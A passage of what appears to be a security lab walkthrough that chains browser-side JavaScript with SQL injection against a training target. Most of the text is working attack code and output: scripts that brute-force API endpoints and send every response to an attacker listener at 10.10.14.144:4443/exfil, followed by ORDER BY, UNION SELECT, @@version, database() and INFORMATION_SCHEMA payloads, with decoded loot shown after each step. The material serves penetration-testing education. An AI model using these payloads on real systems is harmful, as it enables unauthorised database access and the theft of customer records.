W5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ | base64 -d
```

```shell-session
─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-rqggb9lmbe]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8YmFzZSBocmVmPSIuLyI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkNvcmVVSSAtIE9wZW4gU291cmNlIEJvb3RzdHJhcCBBZG1pbiBUZW1wbGF0ZSI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CiAgICA8dGl0bGU+Q29yZVVJIEZyZWUgQm9vdHN0cmFwIEFkbWluIFRlbXBsYXRlPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9ImFzc2V0cy9mYXZpY29uL21hbmlmZXN0Lmpzb24iPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlQ29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9ImFzc2V0cy9mYXZpY29uL21zLWljb24tMTQ0eDE0NC5wbmciPgogICAgPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiNmZmZmZmYiPgogICAgPCEtLSBWZW5kb3JzIHN0eWxlcy0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJ2ZW5kb3JzL3NpbXBsZWJhci9jc3Mvc2ltcGxlYmFyLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy92ZW5kb3JzL3NpbXBsZWJhci5jc3MiPgogICAgPCEtLSBNYWluIHN0eWxlcyBmb3IgdGhpcyBhcHBsaWNhdGlvbi0tPgogICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDwhLS0gV2UgdXNlIHRob3NlIHN0eWxlcyB0byBzaG93IGNvZGUgZXhhbXBsZXMsIHlvdSBzaG91bGQgcmVtb3ZlIHRoZW0gaW4geW91ciBhcHBsaWNhdGlvbi4tLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9leGFtcGxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8bGluayBocmVmPSJ2ZW5kb3JzL0Bjb3JldWkvY2hhcnRqcy9jc3MvY29yZXVpLWNoYXJ0anMuY3NzIiByZWw9InN0eWxlc2hlZXQiPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIgZC1mbGV4IGZsZXgtY29sdW1uIG1pbi12aC0xMDAgYmctbGlnaHQiPgogICAgICA8aGVhZGVyIGNsYXNzPSJoZWFkZXIgaGVhZGVyLXN0aWNreSBtYi00Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItZGl2aWRlciI+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgIDxuYXYgYXJpYS1sYWJlbD0iYnJlYWRjcnVtYiI+CiAgICAgICAgICAgIDxvbCBjbGFzcz0iYnJlYWRjcnVtYiBteS0wIG1zLTIiPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iYnJlYWRjcnVtYi1pdGVtIj4KICAgICAgICAgICAgICAgIDwhLS0gaWYgYnJlYWRjcnVtYiBpcyBzaW5nbGUtLT48c3Bhbj5Ib21lPC9zcGFuPgogICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0gYWN0aXZlIj48c3Bhbj5BZG1pbiBQYW5lbDwvc3Bhbj48L2xpPgogICAgICAgICAgICA8L29sPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJib2R5IGZsZXgtZ3Jvdy0xIHB4LTMiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1sZyI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICA8aDQgY2xhc3M9ImNhcmQtdGl0bGUgbWItMCI+QWRtaW4gUGFuZWwgLSBDdXN0b21lcnM8L2g0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDwhLS0gTG9hZCBkYXRhIGZyb20gQVBJIC0tPgogICAgICAgICAgICAgIDxzY3JpcHQgc3JjPSJqcy9hcGkuanMiPjwvc2NyaXB0PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1yZXNwb25zaXZlIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRhYmxlIGJvcmRlciBtYi0wIiBpZD0ibXlUYWJsZSI+CiAgICAgICAgICAgICAgICAgICAgICA8dGhlYWQgY2xhc3M9InRhYmxlLWxpZ2h0IGZ3LXNlbWlib2xkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyIGNsYXNzPSJhbGlnbi1taWRkbGUiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDx0aD5OYW1lPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgICA8dGg+QWRkcmVzczwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICA8L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8IS0tIC8uY2FyZC5tYi00LS0+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIENvcmVVSSBhbmQgbmVjZXNzYXJ5IHBsdWdpbnMtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL0Bjb3JldWkvY29yZXVpL2pzL2NvcmV1aS5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL3NpbXBsZWJhci9qcy9zaW1wbGViYXIubWluLmpzIj48L3NjcmlwdD4KICAgIDwhLS0gUGx1Z2lucyBhbmQgc2NyaXB0cyByZXF1aXJlZCBieSB0aGlzIHZpZXctLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3JzL2NoYXJ0LmpzL2pzL2NoYXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9ycy9AY29yZXVpL2NoYXJ0anMvanMvY29yZXVpLWNoYXJ0anMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvcnMvQGNvcmV1aS91dGlscy9qcy9jb3JldWktdXRpbHMuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9ImpzL2xvZ2ljLmpzIj48L3NjcmlwdD4KCiAgPC9ib2R5Pgo8L2h0bWw+ | base64 -d

<!DOCTYPE html>
<html lang="en">
  <head>
    <base href="./">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="description" content="CoreUI - Open Source Bootstrap Admin Template">
    <meta name="author" content="">
    <title>CoreUI Free Bootstrap Admin Template</title>

<SNIP>

              <!-- Load data from API -->
              <script src="js/api.js"></script>
```

The admin panel reveals the location of an `api.js` file. Subsequently, students need to browse to `https://vulnerablesite.htb/js/api.js` and view it's contents:

Code: javascript

```javascript
fetch("https://api.vulnerablesite.htb/v1/customers", {
    method: "GET"
}).then((response) => {
    return response.json();
}).then((data) => {
    // add to DOM
    var table = document.getElementById("myTable");
    for (let i = 0; i < data['customers'].length; i++) {
        let obj = data['customers'][i];
        var row = table.insertRow();
        var cell1 = row.insertCell();
        var cell2 = row.insertCell();
        cell1.innerHTML = obj[1];
        cell2.innerHTML = obj[2];
    }
});
```

The script reveals the location of an API, `https://api.vulnerablesite.htb/v1/customers`.

Students will find that direct access to the `customers` endpoint is blocked. Therefore, students need to use a brute-forcer to identify other endpoint(s) within the API.

Code: javascript

```javascript
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `https://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

Checking the log, students will find two endpoints are returned:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.27.179 - - [05/Jan/2025 11:07:51] code 404, message File not found
10.129.27.179 - - [05/Jan/2025 11:07:51] "GET /exfil?r=Y3VzdG9tZXI= HTTP/1.1" 404 -
10.129.27.179 - - [05/Jan/2025 11:07:52] code 404, message File not found
10.129.27.179 - - [05/Jan/2025 11:07:52] "GET /exfil?r=Y3VzdG9tZXJz HTTP/1.1" 404 -
```

Students need to decode these responses, identifying `customers` and `customer` endpoints:

Code: shell

```shell
echo Y3VzdG9tZXJz | base64 -d
echo Y3VzdG9tZXI= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo Y3VzdG9tZXJz | base64 -d

customers

┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo Y3VzdG9tZXI= | base64 -d

customer
```

Students need to enumerate the `customer` endpoint further:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.vulnerablesite.htb/v1/customer', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

However, students will find the API returns an error response, indicating a customer ID must be specified:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.27.179 - - [05/Jan/2025 11:07:51] code 404, message File not found
10.129.27.179 - - [05/Jan/2025 11:07:51] "GET /exfil?r=eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= HTTP/1.1" 404 -
```

Code: shell

```shell
echo eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo eyJlcnJvciI6IlBsZWFzZSBzcGVjaWZ5IGEgY3VzdG9tZXIgSUQifQo= | base64 -d

{"error":"Please specify a customer ID"}
```

Students need to specify an ID like so:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.vulnerablesite.htb/v1/customer/1', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

By specifying an ID, students will see that they can successfully fetch customer information from the database:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.27.179 - - [05/Jan/2025 11:07:51] code 404, message File not found
10.129.27.179 - - [05/Jan/2025 11:07:51] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== HTTP/1.1" 404 -
```

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

Students need to test for SQL injection against the `customer` endpoint:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' OR '1'='1' -- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

The API returns the same response as before; confirming the injection vulnerability:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-rcz97x5to9]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

Students need to modify their payload, using the `ORDER BY` function to discover the number of columns in the table being returned. Students need to first test for `3` columns:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/1' ORDER BY 3-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

The API successfully returns user data while ordering by column `3`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d
```

Code: shell

```shell
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMzYzOCBHb29zZXRvd24gRHJpdmUsIEFzaGV2aWxsZSwgTkMgMjg4MDYiLCJuYW1lIjoiSm9zaCBOLiBCcmFkbGV5In19Cg== | base64 -d

{"customer":{"address":"3638 Goosetown Drive, Asheville, NC 28806","name":"Josh N. Bradley"}}
```

However, when attempting to order by column `4`, students will see the API returns an error:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/1' ORDER BY 4-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo eyJlcnJvciI6IkN1c3RvbWVyIG5vdCBmb3VuZCJ9Cg== | base64 -d

{"error":"Customer not found"}
```

Therefore, students will know that the table has `3` columns. With this information, students need to use `UNION` injection to further enumerate the database, beginning by enumerating the backend DBMS in use. Students need to use the `@@version` payload to test for `MySQL`:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,@@version-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Decoding the response, students will confirm that the DBMS in use is `MySQL`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMTAuMTEuNC1NYXJpYURCLTF+ZGViMTJ1MSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-3sabvo7h2g]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiMTAuMTEuNC1NYXJpYURCLTF+ZGViMTJ1MSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"10.11.4-MariaDB-1~deb12u1","name":"2"}}
```

Next, students need to use the `database()` payload to find the current database:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,database()-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Decoding the exfiltrated response, students will see the database is named `db`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZGIiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiZGIiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"db","name":"2"}}
```

Knowing the name of the database, students now need to enumerate tables:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Students will note that the API returns only one row of data, and only the `customers` table is revealed:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiY3VzdG9tZXJzIiwibmFtZSI6IjIifX0K | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
